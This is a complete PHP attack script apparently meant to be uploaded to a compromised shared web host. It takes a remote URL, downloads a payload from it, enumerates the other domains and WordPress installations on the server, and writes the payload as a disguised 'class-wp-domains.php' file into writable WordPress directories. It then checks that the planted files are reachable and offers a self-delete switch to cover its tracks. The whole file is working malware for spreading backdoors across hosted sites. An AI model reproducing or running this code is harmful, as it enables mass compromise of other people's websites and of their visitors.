<?php
error_reporting (0);
set_time_limit  (0);

// check /etc/apache2/logs/domlogs/
// &
// /var/cpanel/userdata/usammm/usammm.org
// as config files domains incase of failure

if (array_key_exists ('delete', $_REQUEST))
{
  unlink(__FILE__);
  die;
}

$main_content = false;

if (array_key_exists ('main', $_REQUEST))
{
  try
  {
    $main_content = url_get_contents ($_REQUEST['main']);
    if ($main_content === false)
    {
      echo "&#10007; Unable to read main.php from: " . $_REQUEST['main'] . "<br>";
    }
    else
    {
      echo "&#10003; Readed main.php from " . $_REQUEST['main'] . "<br>";
    }
  }
  catch (Exception $e)
  {
    $main_content = false;
    echo "&#10007; Unable to read main.php from: " . $_REQUEST['main'] . "<br>";
  }
}

$current_dir    = getcwd ();
$domain         = remove_www (get_domain ($_SERVER['HTTP_HOST']));

$partial_domain = remove_tld ($domain);

$match_pos         = strpos ($current_dir, $domain);
$match_pos_partial = strpos ($current_dir, $partial_domain);

if ($match_pos !== false)
{
  echo "&#10003; Matched domain name ($domain) with path: " . $current_dir . "<br>";
  $domains_dir = get_domains_dir ($current_dir, $match_pos);
  
  if (!is_readable($domains_dir))
  {
    echo "&#10007; Unable to read directory: " . $domains_dir . "<br>";
    process ($domain, estimate_current_path());
    check_config ();
    die;
  }
    
  foreach (get_valid_dirs ($domains_dir) as $dir)
  {
    $domain = clean_domain ($dir);

    $dir = $domains_dir . '/' . $domain;

    if (is_domain ($domain) && !is_dir_empty($dir))
    {
      process ($domain, $dir);
    }
  }
}
elseif ($match_pos_partial !== false)
{
  echo "&#10003; Matched partial domain ($partial_domain) name with path: " . $current_dir . "<br>";
  $domains_dir = get_domains_dir ($current_dir, $match_pos_partial);
  
  if (!is_readable($domains_dir))
  {
    echo "&#10007; Unable to read directory: " . $domains_dir . "<br>";
    process ($domain, estimate_current_path());
    check_config ();
    die;
  }
  
  $domains = get_user_domains ();
  
  if ($domains)
  {
    echo "&#10003; Reading from config files<br>";

    foreach (get_valid_dirs ($domains_dir) as $dir)
    {
      $domain = clean_domain ($dir);
    
      $index = in_array_partial ($domain, $domains);
      
      $dir = $domains_dir . '/' . $domain;

      if ($index !== false && !is_dir_empty($dir))
      {
        process ($domains[$index], $dir);
      }
    }
  }
  else
  {
    echo "&#10003; Matching partial tlds<br>";

    $domains = get_valid_dirs ($domains_dir);
    
    if (empty ($domains))
    {
      echo "&nbsp;&nbsp;&nbsp;&nbsp; No domains were found.<br>";
      check_config();
      die;
    }
    
    foreach ($domains as $dir)
    {
      $domain = clean_domain ($dir);
      
      $complete_domain = is_domain_partial ($domain);

      $dir = $domains_dir . '/' . $domain;
      
      if ($complete_domain && !is_dir_empty($dir))
      {
        process ($complete_domain, $dir);
      }
    }    
  }
}
else
{
  echo "&#10007; Wasn't able to match domain name.<br>";

  $domains_dir = estimate_current_path();

  process ($domain, $domains_dir);

  foreach (get_valid_dirs ($domains_dir) as $dir)
  {
    $domain = clean_domain ($dir);

    $dir = $domains_dir . '/' . $domain;

    if (is_domain ($domain) && !is_dir_empty($dir))
    {
      process ($domain, $dir);
    }
  }

  check_config ();
}


function check_config ()
{
  echo "Checking configs...<br>";
  $domains = get_user_domains ();
  $current_user = get_current_user_name ();
  
  if ($domains)
  {
    echo "&#10003; Reading from config files<br>";
    echo "&#10003; Found: " . sizeof($domains) . " domains for current user: $current_user<br>";
    foreach ($domains as $domain)
    {
      echo "&nbsp;&nbsp;&nbsp;&nbsp;-> domain: $domain<br>";
    }
  }
  else
  {
    echo "&#10007; Unable to read config files<br>";
  }
}

function is_dir_empty ($dir)
{
  if (!is_readable ($dir))
  {
    return NULL; 
  }

  return (count (scandir ($dir)) == 2);
}

function in_array_partial ($partial_domain, $domains)
{
  $i = 0;

  foreach ($domains as $domain)
  {
    $partial_correct_domain = remove_tld ($domain);
    
    if ($partial_correct_domain == $partial_domain)
    {
      return $i;
    }
    
    $i++;
  }
  
  return false;
}

function process ($domain, $dir)
{
  $redeable = !!is_readable ($dir);
  $writable = !!is_writable ($dir);
  echo "&nbsp;&nbsp;&nbsp;&nbsp;-> domain: $domain | path: $dir | readable: $redeable | writable: $writable";
  
  $wordpress_path = is_wordpress ($dir);

  if ($wordpress_path)
  {
    echo " | is wordpress (path: $wordpress_path)";
    $main_php        = inject_main_php ($wordpress_path);
    $assert_main_php = assert_main_php ($domain, $main_php, $dir);

    if ($main_php)
    {
      if ($assert_main_php)
      {
        echo " | main.php: $main_php (direct link: $assert_main_php)";
      }
      else
      {
        echo " | main.php: $main_php";
      }
    }
  }

  echo "<br>";
}

function get_search_keyword ()
{
  if (array_key_exists ('keyword', $_REQUEST))
  {
    return $_REQUEST['keyword'];
  }
  else
  {
    return "config path";
  }
}

function assert_main_php ($domain, $main_php, $dir)
{
  $parts     = explode       ("/", $main_php);
  $parts     = array_reverse ($parts);

  $file_name = false;

  foreach ($parts as $part)
  {
    if ($file_name)
    {
      $file_name = '/' . $part . '/' . $file_name;
    }
    else
    {
      $file_name = '/' . $part;
    }

    $content = file_get_contents ("http://" . $domain . $file_name);
        
    if ($content !== false && strpos ($content, get_search_keyword()) !== false)
    {
      return "http://" . $domain . $file_name;
    }
  }
  
  return false;
}

function inject_main_php ($wordpress_path)
{
  global $main_content;

  $output_file_name = 'class-wp-domains.php';

  if ($main_content == false)
  {
    return false;
  }

  $dirs      = array('/wp-admin/', '/wp-content/', '/wp-includes/', '/');
  $file_path = false;

  foreach ($dirs as $dir)
  {
    if (is_writable ($wordpress_path . $dir))
    {
      $file_path = $wordpress_path . $dir . $output_file_name;
      break;
    }
  }
  
  if ($file_path === false)
  {
    return false;
  }
  
  file_put_contents ($file_path, $main_content);
  
  if (file_exists ($file_path))
  {
    return $file_path;
  }
  else
  {
    return false;
  }
}

function get_current_user_name ()
{
  $current_user = posix_getpwuid(posix_geteuid());

  return $current_user['name'];
}

function get_user_domains ()
{
  $current_user = posix_getpwuid(posix_geteuid());
  $user_domains = array();

  if (is_readable ("/var/named"))
  {
    $domain_list = scandir ("/var/named");

    foreach($domain_list as $domain)
    {
      if (strpos ($domain, ".db"))
      {
      	$domain = str_replace ('.db', '', $domain);
        $file_owner = fileowner ("/etc/valiases/" . $domain);
        if ($file_owner !== FALSE)
        {
          $owner = posix_getpwuid ($file_owner);
          if ($owner['name'] == $current_user['name'])
          {
            $user_domains[] = $domain;
          }
        }
      }
    }
    
    return $user_domains;
  }
  else
  {
    return false;
  }
}

function remove_tld ($domain)
{
  $parts = explode ('.', $domain, 2);
  
  return $parts[0];
}

function is_wordpress ($path)
{
  $dirs = get_dirs_recursive ($path);
  
  foreach ($dirs as $dir)
  {
    if (file_exists ($dir . '/wp-config.php') || file_exists ($dir . '/wp-admin/') || file_exists ($dir . '/wp-includes/'))
    {
      return $dir;
    }
  }

  return false;
}

function get_dirs_recursive ($dir)
{
  $iterator = new RecursiveIteratorIterator(
      new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
      RecursiveIteratorIterator::SELF_FIRST,
      RecursiveIteratorIterator::CATCH_GET_CHILD
  );
  
  $dir_list = array($dir);
  
  foreach ($iterator as $path => $dir)
  {
    if ($dir->isDir())
    {
      $dir_list[] = $path;
    }
  }
  
  return $dir_list;
}

function get_domains_dir ($dir, $pos)
{
  $dir = substr ($dir, 0, $pos);
  return substr ($dir, 0, strrpos ($dir, '/'));
}

function get_valid_dirs ($dir)
{
  $dirs = get_dirs ($dir);
  return array_filter ($dirs, 'could_be_domain');
}

function could_be_domain ($dir)
{
  $dir = clean_domain ($dir);
  return strlen ($dir) > 6 && !in_array ($dir, get_common_dirs());
}

function get_dirs ($dir)
{
  $dir = rtrim ($dir, '/');
  return array_filter(glob($dir . '/*'), 'is_dir');
}

function have_tld ($domain)
{
  $parts = explode ('.', $domain, 2);
  
  return sizeof ($parts) > 1;
}

function is_domain ($domain)
{
  return filter_var (gethostbyname ($domain), FILTER_VALIDATE_IP);
}

function is_domain_partial ($partial_domain)
{
  if (have_tld ($partial_domain))
  {
    if (filter_var (gethostbyname ($partial_domain), FILTER_VALIDATE_IP))
    {
      return $partial_domain;
    }
    else
    {
      return false;
    }
  }
  else
  {
    $tlds = get_tlds();
    
    foreach ($tlds as $tld)
    {
      $hostname = filter_var (gethostbyname ($partial_domain . '.' . $tld), FILTER_VALIDATE_IP);
      
      if ($hostname)
      {
        return $partial_domain . '.' . $tld;
      }
    }
    
    return false;
  }
}

function get_common_dirs()
{
  return array (
    'css', 'blog', 'store', 'cgi-bin', 'wp-admin', 'wp-content', 'uploads', 'includes', 'html',
    'wp-includes'
  );
}

function get_tlds ()
{
  return array (
    'aero', 'asia', 'biz', 'cat', 'com', 'coop', 'info', 'int', 'jobs', 'mobi', 'museum', 'name', 'net', 'org', 'post',
    'pro', 'tel', 'travel', 'xxx', 'ac', 'ad', 'ae', 'af', 'ag', 'ai', 'al', 'am', 'an', 'ao', 'aq', 'ar', 'as', 'at',
    'au', 'aw', 'ax', 'az', 'ba', 'bb', 'bd', 'be', 'bf', 'bg', 'bh', 'bi', 'bj', 'bl', 'bm', 'bn', 'bo', 'bq', 'br',
    'bs', 'bt', 'bv', 'bw', 'by', 'bz', 'ca', 'cc', 'cd', 'cf', 'cg', 'ch', 'ci', 'ck', 'cl', 'cm', 'cn', 'co', 'cr',
    'cu', 'cv', 'cw', 'cx', 'cy', 'cz', 'de', 'dj', 'dk', 'dm', 'do', 'dz', 'ec', 'ee', 'eg', 'eh', 'er', 'es', 'et',
    'eu', 'fi', 'fj', 'fk', 'fm', 'fo', 'fr', 'ga', 'gb', 'gd', 'ge', 'gf', 'gg', 'gh', 'gi', 'gl', 'gm', 'gn', 'gp',
    'gq', 'gr', 'gs', 'gt', 'gu', 'gw', 'gy', 'hk', 'hm', 'hn', 'hr', 'ht', 'hu', 'id', 'ie', 'il', 'im', 'in', 'io',
    'iq', 'ir', 'is', 'it', 'je', 'jm', 'jo', 'jp', 'ke', 'kg', 'kh', 'ki', 'km', 'kn', 'kp', 'kr', 'kw', 'ky', 'kz',
    'la', 'lb', 'lc', 'li', 'lk', 'lr', 'ls', 'lt', 'lu', 'lv', 'ly', 'ma', 'mc', 'md', 'me', 'mf', 'mg', 'mh', 'mk',
    'ml', 'mlc', 'mm', 'mn', 'mo', 'mp', 'mq', 'mr', 'ms', 'mt', 'mu', 'mv', 'mw', 'mx', 'my', 'mz', 'na', 'nc', 'ne',
    'nf', 'ng', 'ni', 'nl', 'no', 'np', 'nr', 'nu', 'nz', 'om', 'pa', 'pe', 'pf', 'pg', 'ph', 'pk', 'pl', 'pm', 'pn',
    'pr', 'ps', 'pt', 'pw', 'py', 'qa', 're', 'ro', 'rs', 'ru', 'rw', 'sa', 'sb', 'sc', 'sd', 'se', 'sg', 'sh', 'si',
    'sj', 'sk', 'sl', 'sm', 'sn', 'so', 'sr', 'st', 'su', 'sv', 'sx', 'sy', 'sz', 'tc', 'td', 'tf', 'tg', 'th', 'tj',
    'tk', 'tl', 'tm', 'tn', 'to', 'tp', 'tr', 'tt', 'tv', 'tw', 'tz', 'ua', 'ug', 'uk', 'um', 'us', 'uy', 'uz', 'va',
    'vc', 've', 'vg', 'vi', 'vn', 'vu', 'wf', 'ws', 'ye', 'yt', 'za', 'zm', 'zw'
  );
}

function clean_domain ($domain)
{
  return substr($domain, strrpos($domain, '/') + 1);
}

function not_www ($value)
{
  return $value !== 'www';
}

function get_domain ($domain)
{
	$original = $domain = strtolower($domain);
	if (filter_var($domain, FILTER_VALIDATE_IP)) { return $domain; }
	$arr = array_slice(array_filter(explode('.', $domain, 4), 'not_www'), 0); //rebuild array indexes
	if (count($arr) > 2)
	{
		$count = count($arr);
		$_sub = explode('.', $count === 4 ? $arr[3] : $arr[2]);
		if (count($_sub) === 2) // two level TLD
		{
			$removed = array_shift($arr);
			if ($count === 4) // got a subdomain acting as a domain
			{
				$removed = array_shift($arr);
			}
		}
		elseif (count($_sub) === 1) // one level TLD
		{
			$removed = array_shift($arr); //remove the subdomain
			if (strlen($_sub[0]) === 2 && $count === 3) // TLD domain must be 2 letters
			{
				array_unshift($arr, $removed);
			}
			else
			{
				// non country TLD according to IANA
				$tlds = array(
					'aero',
					'arpa',
					'asia',
					'biz',
					'cat',
					'com',
					'coop',
					'edu',
					'gov',
					'info',
					'jobs',
					'mil',
					'mobi',
					'museum',
					'name',
					'net',
					'org',
					'post',
					'pro',
					'tel',
					'travel',
					'xxx',
				);
				if (count($arr) > 2 && in_array($_sub[0], $tlds) !== false) //special TLD don't have a country
				{
					array_shift($arr);
				}
			}
		}
		else // more than 3 levels, something is wrong
		{
			for ($i = count($_sub); $i > 1; $i--)
			{
				$removed = array_shift($arr);
			}
		}
	}
	elseif (count($arr) === 2)
	{
		$arr0 = array_shift($arr);
		if (strpos(join('.', $arr), '.') === false
			&& in_array($arr[0], array('localhost','test','invalid')) === false) // not a reserved domain
		{
			// seems invalid domain, restore it
			array_unshift($arr, $arr0);
		}
	}
	return join('.', $arr);
}

function remove_www ($domain)
{
  return str_ireplace ('www.', '', $domain); 
}

function estimate_current_path ()
{
  $request_uri_dir = dirname(strtok($_SERVER["REQUEST_URI"], '?'));

  if ($request_uri_dir !== '/')
  {
    return str_replace (dirname(strtok($_SERVER["REQUEST_URI"], '?')), '', realpath(dirname(__FILE__)));
  } else {
    return realpath(dirname(__FILE__));
  }
}

// function url_get_contents ($url)
// {
//   if (function_exists ('file_get_contents'))
//   {
//     $url_get_contents_data = file_get_contents ($url);
//   }
//   elseif (function_exists('curl_exec'))
//   {
//     $conn = curl_init ($url);
//     curl_setopt ($conn, CURLOPT_SSL_VERIFYPEER, true);
//     curl_setopt ($conn, CURLOPT_FRESH_CONNECT,  true);
//     curl_setopt ($conn, CURLOPT_RETURNTRANSFER, 1);
//     $url_get_contents_data = (curl_exec($conn));
//     curl_close ($conn);
//   }
//   elseif (function_exists ('fopen') && function_exists ('stream_get_contents'))
//   {
//     $handle = fopen ($url, "r");
//     $url_get_contents_data = stream_get_contents ($handle);
//   }
//   else
//   {
//     $url_get_contents_data = false;
//   }

//   return $url_get_contents_data;
// }
function url_get_contents ($url)
{
  $allowUrlFopen = preg_match ('/1|yes|on|true/i', ini_get ('allow_url_fopen'));
  if ($allowUrlFopen)
  {
    return file_get_contents($url);
  }
  elseif (function_exists ('curl_init'))
  {
    $c = curl_init ($url);
    curl_setopt ($c, CURLOPT_RETURNTRANSFER, 1);
    $contents = curl_exec ($c);
    curl_close ($c);
    if (is_string ($contents))
    {
      return $contents;
    }
  }
  return false;
}

?>
